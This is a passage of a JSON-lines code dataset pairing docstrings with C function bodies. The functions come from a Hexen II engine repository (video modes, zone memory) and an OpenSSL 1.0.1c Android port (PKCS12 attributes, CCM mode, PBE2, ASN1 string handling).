16:\n\t\t\t\t\t\t\t\tbpp = 32;\n\t\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t\tcase 32:\n\t\t\t\t\t\t\t\tbpp = 24;\n\t\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t\tcase 24:\n\t\t\t\t\t\t\t\tdone = 1;\n\t\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t\telse\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\tdone = 1;\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t} while (!done);\n\n\t\t\t\tif (!vid_default)\n\t\t\t\t{\n\t\t\t\t\tSys_Error (\"Specified video mode not available\");\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n\n\tvid_initialized = true;\n\n\tvid.maxwarpwidth = WARP_WIDTH;\n\tvid.maxwarpheight = WARP_HEIGHT;\n\tvid.colormap = host_colormap;\n\tvid.fullbright = 256 - LittleLong (*((int *)vid.colormap + 2048));\n\n\tDestroyWindow (hwnd_dialog);\n\n\tVID_SetMode (vid_default, palette);\n\n    maindc = GetDC(mainwindow);\n\tbSetupPixelFormat(maindc);\n\n    baseRC = wglCreateContext( maindc );\n\tif (!baseRC)\n\t\tSys_Error (\"wglCreateContect failed\");\n    if (!wglMakeCurrent( maindc, baseRC ))\n\t\tSys_Error (\"wglMakeCurrent failed\");\n\n\tGL_Init ();\n\n\tsprintf (gldir, \"%s/glhexen\", com_gamedir);\n\tSys_mkdir (gldir);\n\tsprintf (gldir, \"%s/glhexen/boss\", com_gamedir);\n\tSys_mkdir (gldir);\n\tsprintf (gldir, \"%s/glhexen/puzzle\", com_gamedir);\n\tSys_mkdir (gldir);\n\n\tvid_realmode = vid_modenum;\n\n\tVID_SetPalette (palette);\n\n\tvid_menudrawfn = VID_MenuDraw;\n\tvid_menukeyfn = VID_MenuKey;\n\n\tstrcpy (badmode.modedesc, \"Bad mode\");\n}", "path": "H2MP\\code\\gl_vidnt.c", "repo_name": "videogamepreservation/hexen2", "stars": 39, "license": "None", "language": "c", "size": 2177}
{"docstring": "/*\n========================\nZ_Free\n========================\n*/\n", "func_signal": "void Z_Free (void *ptr)", "code": "{\n\tmemblock_t\t*block, *other;\n\t\n\tif (!ptr)\n\t\tSys_Error (\"Z_Free: NULL pointer\");\n\n\tblock = (memblock_t *) ( (byte *)ptr - sizeof(memblock_t));\n\tif (block->id != ZONEID)\n\t\tSys_Error (\"Z_Free: freed a pointer without ZONEID\");\n\tif (block->tag == 0)\n\t\tSys_Error (\"Z_Free: freed a freed pointer\");\n\n\tblock->tag = 0;\t\t// mark as free\n\t\n\tother = block->prev;\n\tif (!other->tag)\n\t{\t// merge with previous free block\n\t\tother->size += block->size;\n\t\tother->next = block->next;\n\t\tother->next->prev = other;\n\t\tif (block == mainzone->rover)\n\t\t\tmainzone->rover = other;\n\t\tblock = other;\n\t}\n\t\n\tother = block->next;\n\tif (!other->tag)\n\t{\t// merge the next free block onto the end\n\t\tblock->size += other->size;\n\t\tblock->next = other->next;\n\t\tblock->next->prev = block;\n\t\tif (other == mainzone->rover)\n\t\t\tmainzone->rover = block;\n\t}\n}", "path": "H2W\\Client\\zone.c", "repo_name": "videogamepreservation/hexen2", "stars": 39, "license": "None", "language": "c", "size": 2177}
{"docstring": "/*\n================\nVID_MenuKey\n================\n*/\n", "func_signal": "void VID_MenuKey (int key)", "code": "{\n\tswitch (key)\n\t{\n\tcase K_ESCAPE:\n\t\tS_LocalSound (\"raven/menu1.wav\");\n\t\tM_Menu_Options_f ();\n\t\tbreak;\n\n\tdefault:\n\t\tbreak;\n\t}\n}", "path": "H2MP\\code\\gl_vidnt.c", "repo_name": "videogamepreservation/hexen2", "stars": 39, "license": "None", "language": "c", "size": 2177}
{"docstring": "/*\n================\nVID_MenuDraw\n================\n*/\n", "func_signal": "void VID_MenuDraw (void)", "code": "{\n\tqpic_t\t\t*p;\n\tchar\t\t*ptr;\n\tint\t\t\tlnummodes, i, j, k, column, row, dup, dupmode;\n\tchar\t\ttemp[100];\n\tvmode_t\t\t*pv;\n\n\tScrollTitle(\"gfx/menu/title7.lmp\");\n\n\tvid_wmodes = 0;\n\tlnummodes = VID_NumModes ();\n\t\n\tfor (i=1 ; (i<lnummodes) && (vid_wmodes < MAX_MODEDESCS) ; i++)\n\t{\n\t\tptr = VID_GetModeDescription (i);\n\t\tpv = VID_GetModePtr (i);\n\n\t\tk = vid_wmodes;\n\n\t\tmodedescs[k].modenum = i;\n\t\tmodedescs[k].desc = ptr;\n\t\tmodedescs[k].iscur = 0;\n\n\t\tif (i == vid_modenum)\n\t\t\tmodedescs[k].iscur = 1;\n\n\t\tvid_wmodes++;\n\n\t}\n\n\tif (vid_wmodes > 0)\n\t{\n\t\tM_Print (2*8, 60+0*8, \"Fullscreen Modes (WIDTHxHEIGHTxBPP)\");\n\n\t\tcolumn = 8;\n\t\trow = 60+2*8;\n\n\t\tfor (i=0 ; i<vid_wmodes ; i++)\n\t\t{\n\t\t\tif (modedescs[i].iscur)\n\t\t\t\tM_PrintWhite (column, row, modedescs[i].desc);\n\t\t\telse\n\t\t\t\tM_Print (column, row, modedescs[i].desc);\n\n\t\t\tcolumn += 13*8;\n\n\t\t\tif ((i % VID_ROW_SIZE) == (VID_ROW_SIZE - 1))\n\t\t\t{\n\t\t\t\tcolumn = 8;\n\t\t\t\trow += 8;\n\t\t\t}\n\t\t}\n\t}\n\n\tM_Print (3*8, 36 + MODE_AREA_HEIGHT * 8 + 8*2,\n\t\t\t \"Video modes must be set from the\");\n\tM_Print (3*8, 36 + MODE_AREA_HEIGHT * 8 + 8*3,\n\t\t\t \"command line with -width <width>\");\n\tM_Print (3*8, 36 + MODE_AREA_HEIGHT * 8 + 8*4,\n\t\t\t \"and -bpp <bits-per-pixel>\");\n\tM_Print (3*8, 36 + MODE_AREA_HEIGHT * 8 + 8*6,\n\t\t\t \"Select windowed mode with -window\");\n}", "path": "H2MP\\code\\gl_vidnt.c", "repo_name": "videogamepreservation/hexen2", "stars": 39, "license": "None", "language": "c", "size": 2177}
{"docstring": "/*\n========================\nZ_Print\n========================\n*/\n", "func_signal": "void Z_Print (memzone_t *zone)", "code": "{\n\tmemblock_t\t*block;\n\t\n\tCon_Printf (\"zone size: %i  location: %p\\n\",mainzone->size,mainzone);\n\t\n\tfor (block = zone->blocklist.next ; ; block = block->next)\n\t{\n\t\tCon_Printf (\"block:%p    size:%7i    tag:%3i\\n\",\n\t\t\tblock, block->size, block->tag);\n\t\t\n\t\tif (block->next == &zone->blocklist)\n\t\t\tbreak;\t\t\t// all blocks have been hit\t\n\t\tif ( (byte *)block + block->size != (byte *)block->next)\n\t\t\tCon_Printf (\"ERROR: block size does not touch the next block\\n\");\n\t\tif ( block->next->prev != block)\n\t\t\tCon_Printf (\"ERROR: next block doesn't have proper back link\\n\");\n\t\tif (!block->tag && !block->next->tag)\n\t\t\tCon_Printf (\"ERROR: two consecutive free blocks\\n\");\n\t}\n}", "path": "H2W\\Client\\zone.c", "repo_name": "videogamepreservation/hexen2", "stars": 39, "license": "None", "language": "c", "size": 2177}
{"docstring": "/*\n=================\nVID_InitFullDIB\n=================\n*/\n", "func_signal": "void VID_InitFullDIB (HINSTANCE hInstance)", "code": "{\n\tDEVMODE\tdevmode;\n\tint\t\ti, modenum, cmodes, originalnummodes, existingmode, numlowresmodes;\n\tint\t\tj, bpp, done;\n\tBOOL\tstat;\n\n// enumerate >8 bpp modes\n\toriginalnummodes = nummodes;\n\tmodenum = 0;\n\n\tdo\n\t{\n\t\tstat = EnumDisplaySettings (NULL, modenum, &devmode);\n\n\t\tif ((devmode.dmBitsPerPel >= 15) &&\n\t\t\t(devmode.dmPelsWidth <= MAXWIDTH) &&\n\t\t\t(devmode.dmPelsHeight <= MAXHEIGHT) &&\n\t\t\t(nummodes < MAX_MODE_LIST))\n\t\t{\n\t\t\tdevmode.dmFields = DM_BITSPERPEL |\n\t\t\t\t\t\t\t   DM_PELSWIDTH |\n\t\t\t\t\t\t\t   DM_PELSHEIGHT;\n\n\t\t\tif (ChangeDisplaySettings (&devmode, CDS_TEST | CDS_FULLSCREEN) ==\n\t\t\t\t\tDISP_CHANGE_SUCCESSFUL)\n\t\t\t{\n\t\t\t\tmodelist[nummodes].type = MS_FULLDIB;\n\t\t\t\tmodelist[nummodes].width = devmode.dmPelsWidth;\n\t\t\t\tmodelist[nummodes].height = devmode.dmPelsHeight;\n\t\t\t\tmodelist[nummodes].modenum = 0;\n\t\t\t\tmodelist[nummodes].halfscreen = 0;\n\t\t\t\tmodelist[nummodes].dib = 1;\n\t\t\t\tmodelist[nummodes].fullscreen = 1;\n\t\t\t\tmodelist[nummodes].bpp = devmode.dmBitsPerPel;\n\t\t\t\tsprintf (modelist[nummodes].modedesc, \"%dx%dx%d\",\n\t\t\t\t\t\t devmode.dmPelsWidth, devmode.dmPelsHeight,\n\t\t\t\t\t\t devmode.dmBitsPerPel);\n\n\t\t\t// if the width is more than twice the height, reduce it by half because this\n\t\t\t// is probably a dual-screen monitor\n\t\t\t\tif (!COM_CheckParm(\"-noadjustaspect\"))\n\t\t\t\t{\n\t\t\t\t\tif (modelist[nummodes].width > (modelist[nummodes].height << 1))\n\t\t\t\t\t{\n\t\t\t\t\t\tmodelist[nummodes].width >>= 1;\n\t\t\t\t\t\tmodelist[nummodes].halfscreen = 1;\n\t\t\t\t\t\tsprintf (modelist[nummodes].modedesc, \"%dx%dx%d\",\n\t\t\t\t\t\t\t\t modelist[nummodes].width,\n\t\t\t\t\t\t\t\t modelist[nummodes].height,\n\t\t\t\t\t\t\t\t modelist[nummodes].bpp);\n\t\t\t\t\t}\n\t\t\t\t}\n\n\t\t\t\tfor (i=originalnummodes, existingmode = 0 ; i<nummodes ; i++)\n\t\t\t\t{\n\t\t\t\t\tif ((modelist[nummodes].width == modelist[i].width)   &&\n\t\t\t\t\t\t(modelist[nummodes].height == modelist[i].height) &&\n\t\t\t\t\t\t(modelist[nummodes].bpp == modelist[i].bpp))\n\t\t\t\t\t{\n\t\t\t\t\t\texistingmode = 1;\n\t\t\t\t\t\tbreak;\n\t\t\t\t\t}\n\t\t\t\t}\n\n\t\t\t\tif (!existingmode)\n\t\t\t\t{\n\t\t\t\t\tnummodes++;\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\n\t\tmodenum++;\n\t} while (stat);\n\n// see if there are any low-res modes that aren't being reported\n\tnumlowresmodes = sizeof(lowresmodes) / sizeof(lowresmodes[0]);\n\tbpp = 16;\n\tdone = 0;\n\n\tdo\n\t{\n\t\tfor (j=0 ; (j<numlowresmodes) && (nummodes < MAX_MODE_LIST) ; j++)\n\t\t{\n\t\t\tdevmode.dmBitsPerPel = bpp;\n\t\t\tdevmode.dmPelsWidth = lowresmodes[j].width;\n\t\t\tdevmode.dmPelsHeight = lowresmodes[j].height;\n\t\t\tdevmode.dmFields = DM_BITSPERPEL | DM_PELSWIDTH | DM_PELSHEIGHT;\n\n\t\t\tif (ChangeDisplaySettings (&devmode, CDS_TEST | CDS_FULLSCREEN) ==\n\t\t\t\t\tDISP_CHANGE_SUCCESSFUL)\n\t\t\t{\n\t\t\t\tmodelist[nummodes].type = MS_FULLDIB;\n\t\t\t\tmodelist[nummodes].width = devmode.dmPelsWidth;\n\t\t\t\tmodelist[nummodes].height = devmode.dmPelsHeight;\n\t\t\t\tmodelist[nummodes].modenum = 0;\n\t\t\t\tmodelist[nummodes].halfscreen = 0;\n\t\t\t\tmodelist[nummodes].dib = 1;\n\t\t\t\tmodelist[nummodes].fullscreen = 1;\n\t\t\t\tmodelist[nummodes].bpp = devmode.dmBitsPerPel;\n\t\t\t\tsprintf (modelist[nummodes].modedesc, \"%dx%dx%d\",\n\t\t\t\t\t\t devmode.dmPelsWidth, devmode.dmPelsHeight,\n\t\t\t\t\t\t devmode.dmBitsPerPel);\n\n\t\t\t\tfor (i=originalnummodes, existingmode = 0 ; i<nummodes ; i++)\n\t\t\t\t{\n\t\t\t\t\tif ((modelist[nummodes].width == modelist[i].width)   &&\n\t\t\t\t\t\t(modelist[nummodes].height == modelist[i].height) &&\n\t\t\t\t\t\t(modelist[nummodes].bpp == modelist[i].bpp))\n\t\t\t\t\t{\n\t\t\t\t\t\texistingmode = 1;\n\t\t\t\t\t\tbreak;\n\t\t\t\t\t}\n\t\t\t\t}\n\n\t\t\t\tif (!existingmode)\n\t\t\t\t{\n\t\t\t\t\tnummodes++;\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\tswitch (bpp)\n\t\t{\n\t\t\tcase 16:\n\t\t\t\tbpp = 32;\n\t\t\t\tbreak;\n\n\t\t\tcase 32:\n\t\t\t\tbpp = 24;\n\t\t\t\tbreak;\n\n\t\t\tcase 24:\n\t\t\t\tdone = 1;\n\t\t\t\tbreak;\n\t\t}\n\t} while (!done);\n\n\tif (nummodes == originalnummodes)\n\t\tCon_SafePrintf (\"No fullscreen DIB modes found\\n\");\n}", "path": "H2MP\\code\\gl_vidnt.c", "repo_name": "videogamepreservation/hexen2", "stars": 39, "license": "None", "language": "c", "size": 2177}
{"docstring": "/* Add a local keyid to a safebag */\n", "func_signal": "int PKCS12_add_localkeyid(PKCS12_SAFEBAG *bag, unsigned char *name,\n\t     int namelen)", "code": "{\n\tif (X509at_add1_attr_by_NID(&bag->attrib, NID_localKeyID,\n\t\t\t\tV_ASN1_OCTET_STRING, name, namelen))\n\t\treturn 1;\n\telse \n\t\treturn 0;\n}", "path": "crypto\\pkcs12\\p12_attr.c", "repo_name": "aluvalasuman/OpenSSL1.0.1cForAndroid", "stars": 59, "license": "other", "language": "c", "size": 3737}
{"docstring": "/* Override the default free and new methods */\n", "func_signal": "static int rsa_cb(int operation, ASN1_VALUE **pval, const ASN1_ITEM *it,\n\t\t\t\t\t\t\t\tvoid *exarg)", "code": "{\n\tif(operation == ASN1_OP_NEW_PRE) {\n\t\t*pval = (ASN1_VALUE *)RSA_new();\n\t\tif(*pval) return 2;\n\t\treturn 0;\n\t} else if(operation == ASN1_OP_FREE_PRE) {\n\t\tRSA_free((RSA *)*pval);\n\t\t*pval = NULL;\n\t\treturn 2;\n\t}\n\treturn 1;\n}", "path": "crypto\\rsa\\rsa_asn1.c", "repo_name": "aluvalasuman/OpenSSL1.0.1cForAndroid", "stars": 59, "license": "other", "language": "c", "size": 3737}
{"docstring": "/* Add key usage to PKCS#8 structure */\n", "func_signal": "int PKCS8_add_keyusage(PKCS8_PRIV_KEY_INFO *p8, int usage)", "code": "{\n\tunsigned char us_val;\n\tus_val = (unsigned char) usage;\n\tif (X509at_add1_attr_by_NID(&p8->attributes, NID_key_usage,\n\t\t\t\tV_ASN1_BIT_STRING, &us_val, 1))\n\t\treturn 1;\n\telse\n\t\treturn 0;\n}", "path": "crypto\\pkcs12\\p12_attr.c", "repo_name": "aluvalasuman/OpenSSL1.0.1cForAndroid", "stars": 59, "license": "other", "language": "c", "size": 3737}
{"docstring": "/* counter part of nonce may not be larger than L*8 bits,\n * L is not larger than 8, therefore 64-bit counter... */\n", "func_signal": "static void ctr64_inc(unsigned char *counter)", "code": "{\n\tunsigned int n=8;\n\tu8  c;\n\n\tcounter += 8;\n\tdo {\n\t\t--n;\n\t\tc = counter[n];\n\t\t++c;\n\t\tcounter[n] = c;\n\t\tif (c) return;\n\t} while (n);\n}", "path": "crypto\\modes\\ccm128.c", "repo_name": "aluvalasuman/OpenSSL1.0.1cForAndroid", "stars": 59, "license": "other", "language": "c", "size": 3737}
{"docstring": "/* Then you pass additional authentication data, this is optional */\n", "func_signal": "void CRYPTO_ccm128_aad(CCM128_CONTEXT *ctx,\n\tconst unsigned char *aad,size_t alen)", "code": "{\tunsigned int i;\n\tblock128_f block = ctx->block;\n\n\tif (alen==0) return;\n\n\tctx->nonce.c[0] |= 0x40;\t/* set Adata flag */\n\t(*block)(ctx->nonce.c,ctx->cmac.c,ctx->key),\n\tctx->blocks++;\n\n\tif (alen<(0x10000-0x100)) {\n\t\tctx->cmac.c[0] ^= (u8)(alen>>8);\n\t\tctx->cmac.c[1] ^= (u8)alen;\n\t\ti=2;\n\t}\n\telse if (sizeof(alen)==8 && alen>=(size_t)1<<(32%(sizeof(alen)*8))) {\n\t\tctx->cmac.c[0] ^= 0xFF;\n\t\tctx->cmac.c[1] ^= 0xFF;\n\t\tctx->cmac.c[2] ^= (u8)(alen>>(56%(sizeof(alen)*8)));\n\t\tctx->cmac.c[3] ^= (u8)(alen>>(48%(sizeof(alen)*8)));\n\t\tctx->cmac.c[4] ^= (u8)(alen>>(40%(sizeof(alen)*8)));\n\t\tctx->cmac.c[5] ^= (u8)(alen>>(32%(sizeof(alen)*8)));\n\t\tctx->cmac.c[6] ^= (u8)(alen>>24);\n\t\tctx->cmac.c[7] ^= (u8)(alen>>16);\n\t\tctx->cmac.c[8] ^= (u8)(alen>>8);\n\t\tctx->cmac.c[9] ^= (u8)alen;\n\t\ti=10;\n\t}\n\telse {\n\t\tctx->cmac.c[0] ^= 0xFF;\n\t\tctx->cmac.c[1] ^= 0xFE;\n\t\tctx->cmac.c[2] ^= (u8)(alen>>24);\n\t\tctx->cmac.c[3] ^= (u8)(alen>>16);\n\t\tctx->cmac.c[4] ^= (u8)(alen>>8);\n\t\tctx->cmac.c[5] ^= (u8)alen;\n\t\ti=6;\n\t}\n\n\tdo {\n\t\tfor(;i<16 && alen;++i,++aad,--alen)\n\t\t\tctx->cmac.c[i] ^= *aad;\n\t\t(*block)(ctx->cmac.c,ctx->cmac.c,ctx->key),\n\t\tctx->blocks++;\n\t\ti=0;\n\t} while (alen);\n}", "path": "crypto\\modes\\ccm128.c", "repo_name": "aluvalasuman/OpenSSL1.0.1cForAndroid", "stars": 59, "license": "other", "language": "c", "size": 3737}
{"docstring": "/* Add a friendlyname to a safebag */\n", "func_signal": "int PKCS12_add_friendlyname_asc(PKCS12_SAFEBAG *bag, const char *name,\n\t\t\t\t int namelen)", "code": "{\n\tif (X509at_add1_attr_by_NID(&bag->attrib, NID_friendlyName,\n\t\t\t\tMBSTRING_ASC, (unsigned char *)name, namelen))\n\t\treturn 1;\n\telse\n\t\treturn 0;\n}", "path": "crypto\\pkcs12\\p12_attr.c", "repo_name": "aluvalasuman/OpenSSL1.0.1cForAndroid", "stars": 59, "license": "other", "language": "c", "size": 3737}
{"docstring": "/* We treat RSA or DSA private keys as a special case.\n *\n * For private keys we read in an EVP_PKEY structure with\n * PEM_read_bio_PrivateKey() and extract the relevant private\n * key: this means can handle \"traditional\" and PKCS#8 formats\n * transparently.\n */\n", "func_signal": "static RSA *pkey_get_rsa(EVP_PKEY *key, RSA **rsa)", "code": "{\n\tRSA *rtmp;\n\tif(!key) return NULL;\n\trtmp = EVP_PKEY_get1_RSA(key);\n\tEVP_PKEY_free(key);\n\tif(!rtmp) return NULL;\n\tif(rsa) {\n\t\tRSA_free(*rsa);\n\t\t*rsa = rtmp;\n\t}\n\treturn rtmp;\n}", "path": "crypto\\pem\\pem_all.c", "repo_name": "aluvalasuman/OpenSSL1.0.1cForAndroid", "stars": 59, "license": "other", "language": "c", "size": 3737}
{"docstring": "/* Then you setup per-message nonce and pass the length of the message */\n", "func_signal": "int CRYPTO_ccm128_setiv(CCM128_CONTEXT *ctx,\n\tconst unsigned char *nonce,size_t nlen,size_t mlen)", "code": "{\n\tunsigned int L = ctx->nonce.c[0]&7;\t/* the L parameter */\n\n\tif (nlen<(14-L)) return -1;\t\t/* nonce is too short */\n\n\tif (sizeof(mlen)==8 && L>=3) {\n\t\tctx->nonce.c[8]  = (u8)(mlen>>(56%(sizeof(mlen)*8)));\n\t\tctx->nonce.c[9]  = (u8)(mlen>>(48%(sizeof(mlen)*8)));\n\t\tctx->nonce.c[10] = (u8)(mlen>>(40%(sizeof(mlen)*8)));\n\t\tctx->nonce.c[11] = (u8)(mlen>>(32%(sizeof(mlen)*8)));\n\t}\n\telse\n\t\t*(u32*)(&ctx->nonce.c[8]) = 0;\n\n\tctx->nonce.c[12] = (u8)(mlen>>24);\n\tctx->nonce.c[13] = (u8)(mlen>>16);\n\tctx->nonce.c[14] = (u8)(mlen>>8);\n\tctx->nonce.c[15] = (u8)mlen;\n\n\tctx->nonce.c[0] &= ~0x40;\t/* clear Adata flag */\n\tmemcpy(&ctx->nonce.c[1],nonce,14-L);\n\n\treturn 0;\n}", "path": "crypto\\modes\\ccm128.c", "repo_name": "aluvalasuman/OpenSSL1.0.1cForAndroid", "stars": 59, "license": "other", "language": "c", "size": 3737}
{"docstring": "/* Return an algorithm identifier for a PKCS#5 v2.0 PBE algorithm:\n * yes I know this is horrible!\n *\n * Extended version to allow application supplied PRF NID and IV.\n */\n", "func_signal": "X509_ALGOR *PKCS5_pbe2_set_iv(const EVP_CIPHER *cipher, int iter,\n\t\t\t\t unsigned char *salt, int saltlen,\n\t\t\t\t unsigned char *aiv, int prf_nid)", "code": "{\n\tX509_ALGOR *scheme = NULL, *kalg = NULL, *ret = NULL;\n\tint alg_nid, keylen;\n\tEVP_CIPHER_CTX ctx;\n\tunsigned char iv[EVP_MAX_IV_LENGTH];\n\tPBE2PARAM *pbe2 = NULL;\n\tASN1_OBJECT *obj;\n\n\talg_nid = EVP_CIPHER_type(cipher);\n\tif(alg_nid == NID_undef) {\n\t\tASN1err(ASN1_F_PKCS5_PBE2_SET_IV,\n\t\t\t\tASN1_R_CIPHER_HAS_NO_OBJECT_IDENTIFIER);\n\t\tgoto err;\n\t}\n\tobj = OBJ_nid2obj(alg_nid);\n\n\tif(!(pbe2 = PBE2PARAM_new())) goto merr;\n\n\t/* Setup the AlgorithmIdentifier for the encryption scheme */\n\tscheme = pbe2->encryption;\n\n\tscheme->algorithm = obj;\n\tif(!(scheme->parameter = ASN1_TYPE_new())) goto merr;\n\n\t/* Create random IV */\n\tif (EVP_CIPHER_iv_length(cipher))\n\t\t{\n\t\tif (aiv)\n\t\t\tmemcpy(iv, aiv, EVP_CIPHER_iv_length(cipher));\n\t\telse if (RAND_pseudo_bytes(iv, EVP_CIPHER_iv_length(cipher)) < 0)\n  \t\t\tgoto err;\n\t\t}\n\n\tEVP_CIPHER_CTX_init(&ctx);\n\n\t/* Dummy cipherinit to just setup the IV, and PRF */\n\tif (!EVP_CipherInit_ex(&ctx, cipher, NULL, NULL, iv, 0))\n\t\tgoto err;\n\tif(EVP_CIPHER_param_to_asn1(&ctx, scheme->parameter) < 0) {\n\t\tASN1err(ASN1_F_PKCS5_PBE2_SET_IV,\n\t\t\t\t\tASN1_R_ERROR_SETTING_CIPHER_PARAMS);\n\t\tEVP_CIPHER_CTX_cleanup(&ctx);\n\t\tgoto err;\n\t}\n\t/* If prf NID unspecified see if cipher has a preference.\n\t * An error is OK here: just means use default PRF.\n\t */\n\tif ((prf_nid == -1) && \n\tEVP_CIPHER_CTX_ctrl(&ctx, EVP_CTRL_PBE_PRF_NID, 0, &prf_nid) <= 0)\n\t\t{\n\t\tERR_clear_error();\n\t\tprf_nid = NID_hmacWithSHA1;\n\t\t}\n\tEVP_CIPHER_CTX_cleanup(&ctx);\n\n\t/* If its RC2 then we'd better setup the key length */\n\n\tif(alg_nid == NID_rc2_cbc)\n\t\tkeylen = EVP_CIPHER_key_length(cipher);\n\telse\n\t\tkeylen = -1;\n\n\t/* Setup keyfunc */\n\n\tX509_ALGOR_free(pbe2->keyfunc);\n\n\tpbe2->keyfunc = PKCS5_pbkdf2_set(iter, salt, saltlen, prf_nid, keylen);\n\n\tif (!pbe2->keyfunc)\n\t\tgoto merr;\n\n\t/* Now set up top level AlgorithmIdentifier */\n\n\tif(!(ret = X509_ALGOR_new())) goto merr;\n\tif(!(ret->parameter = ASN1_TYPE_new())) goto merr;\n\n\tret->algorithm = OBJ_nid2obj(NID_pbes2);\n\n\t/* Encode PBE2PARAM into parameter */\n\n\tif(!ASN1_item_pack(pbe2, ASN1_ITEM_rptr(PBE2PARAM),\n\t\t\t\t &ret->parameter->value.sequence)) goto merr;\n\tret->parameter->type = V_ASN1_SEQUENCE;\n\n\tPBE2PARAM_free(pbe2);\n\tpbe2 = NULL;\n\n\treturn ret;\n\n\tmerr:\n\tASN1err(ASN1_F_PKCS5_PBE2_SET_IV,ERR_R_MALLOC_FAILURE);\n\n\terr:\n\tPBE2PARAM_free(pbe2);\n\t/* Note 'scheme' is freed as part of pbe2 */\n\tX509_ALGOR_free(kalg);\n\tX509_ALGOR_free(ret);\n\n\treturn NULL;\n\n}", "path": "crypto\\asn1\\p5_pbev2.c", "repo_name": "aluvalasuman/OpenSSL1.0.1cForAndroid", "stars": 59, "license": "other", "language": "c", "size": 3737}
{"docstring": "/* Copy four byte per character UniversalStrings */\n", "func_signal": "static int cpy_univ(unsigned long value, void *arg)", "code": "{\n\tunsigned char **p, *q;\n\tp = arg;\n\tq = *p;\n\t*q++ = (unsigned char) ((value >> 24) & 0xff);\n\t*q++ = (unsigned char) ((value >> 16) & 0xff);\n\t*q++ = (unsigned char) ((value >> 8) & 0xff);\n\t*q = (unsigned char) (value & 0xff);\n\t*p += 4;\n\treturn 1;\n}", "path": "crypto\\asn1\\a_mbstr.c", "repo_name": "aluvalasuman/OpenSSL1.0.1cForAndroid", "stars": 59, "license": "other", "language": "c", "size": 3737}
{"docstring": "/* Determine size of output as a UTF8 String */\n", "func_signal": "static int out_utf8(unsigned long value, void *arg)", "code": "{\n\tint *outlen;\n\toutlen = arg;\n\t*outlen += UTF8_putc(NULL, -1, value);\n\treturn 1;\n}", "path": "crypto\\asn1\\a_mbstr.c", "repo_name": "aluvalasuman/OpenSSL1.0.1cForAndroid", "stars": 59, "license": "other", "language": "c", "size": 3737}
{"docstring": "/* First you setup M and L parameters and pass the key schedule.\n * This is called once per session setup... */\n", "func_signal": "void CRYPTO_ccm128_init(CCM128_CONTEXT *ctx,\n\tunsigned int M,unsigned int L,void *key,block128_f block)", "code": "{\n\tmemset(ctx->nonce.c,0,sizeof(ctx->nonce.c));\n\tctx->nonce.c[0] = ((u8)(L-1)&7) | (u8)(((M-2)/2)&7)<<3;\n\tctx->blocks = 0;\n\tctx->block = block;\n\tctx->key = key;\n}", "path": "crypto\\modes\\ccm128.c", "repo_name": "aluvalasuman/OpenSSL1.0.1cForAndroid", "stars": 59, "license": "other", "language": "c", "size": 3737}
{"docstring": "/* Determine the \"type\" of a string: check each character against a\n * supplied \"mask\".\n */\n", "func_signal": "static int type_str(unsigned long value, void *arg)", "code": "{\n\tunsigned long types;\n\ttypes = *((unsigned long *)arg);\n\tif((types & B_ASN1_PRINTABLESTRING) && !is_printable(value))\n\t\t\t\t\ttypes &= ~B_ASN1_PRINTABLESTRING;\n\tif((types & B_ASN1_IA5STRING) && (value > 127))\n\t\t\t\t\ttypes &= ~B_ASN1_IA5STRING;\n\tif((types & B_ASN1_T61STRING) && (value > 0xff))\n\t\t\t\t\ttypes &= ~B_ASN1_T61STRING;\n\tif((types & B_ASN1_BMPSTRING) && (value > 0xffff))\n\t\t\t\t\ttypes &= ~B_ASN1_BMPSTRING;\n\tif(!types) return -1;\n\t*((unsigned long *)arg) = types;\n\treturn 1;\n}", "path": "crypto\\asn1\\a_mbstr.c", "repo_name": "aluvalasuman/OpenSSL1.0.1cForAndroid", "stars": 59, "license": "other", "language": "c", "size": 3737}
{"docstring": "/* Translate a memory block from EBCDIC (host charset) to ASCII (net charset)\n * dest and srce may be identical, or separate memory blocks, but\n * should not overlap. These functions intentionally have an interface\n * compatible to memcpy(3).\n */\n", "func_signal": "void *\nebcdic2ascii(void *dest, const void *srce, size_t count)", "code": "{\n    unsigned char *udest = dest;\n    const unsigned char *usrce = srce;\n\n    while (count-- != 0) {\n        *udest++ = os_toascii[*usrce++];\n    }\n\n    return dest;\n}", "path": "crypto\\ebcdic.c", "repo_name": "aluvalasuman/OpenSSL1.0.1cForAndroid", "stars": 59, "license": "other", "language": "c", "size": 3737}
{"docstring": "/* Return 1 if the character is permitted in a PrintableString */\n", "func_signal": "static int is_printable(unsigned long value)", "code": "{\n\tint ch;\n\tif(value > 0x7f) return 0;\n\tch = (int) value;\n\t/* Note: we can't use 'isalnum' because certain accented \n\t * characters may count as alphanumeric in some environments.\n\t */\n#ifndef CHARSET_EBCDIC\n\tif((ch >= 'a') && (ch <= 'z')) return 1;\n\tif((ch >= 'A') && (ch <= 'Z')) return 1;\n\tif((ch >= '0') && (ch <= '9')) return 1;\n\tif ((ch == ' ') || strchr(\"'()+,-./:=?\", ch)) return 1;\n#else /*CHARSET_EBCDIC*/\n\tif((ch >= os_toascii['a']) && (ch <= os_toascii['z'])) return 1;\n\tif((ch >= os_toascii['A']) && (ch <= os_toascii['Z'])) return 1;\n\tif((ch >= os_toascii['0']) && (ch <= os_toascii['9'])) return 1;\n\tif ((ch == os_toascii[' ']) || strchr(\"'()+,-./:=?\", os_toebcdic[ch])) return 1;\n#endif /*CHARSET_EBCDIC*/\n\treturn 0;\n}", "path": "crypto\\asn1\\a_mbstr.c", "repo_name": "aluvalasuman/OpenSSL1.0.1cForAndroid", "stars": 59, "license": "other", "language": "c", "size": 3737}
{"docstring": "/* Copy one byte per character ASCII like strings */\n", "func_signal": "static int cpy_asc(unsigned long value, void *arg)", "code": "{\n\tunsigned char **p, *q;\n\tp = arg;\n\tq = *p;\n\t*q = (unsigned char) value;\n\t(*p)++;\n\treturn 1;\n}", "path": "crypto\\asn1\\a_mbstr.c", "repo_name": "aluvalasuman/OpenSSL1.0.1cForAndroid", "stars": 59, "license": "other", "language": "c", "size": 3737}
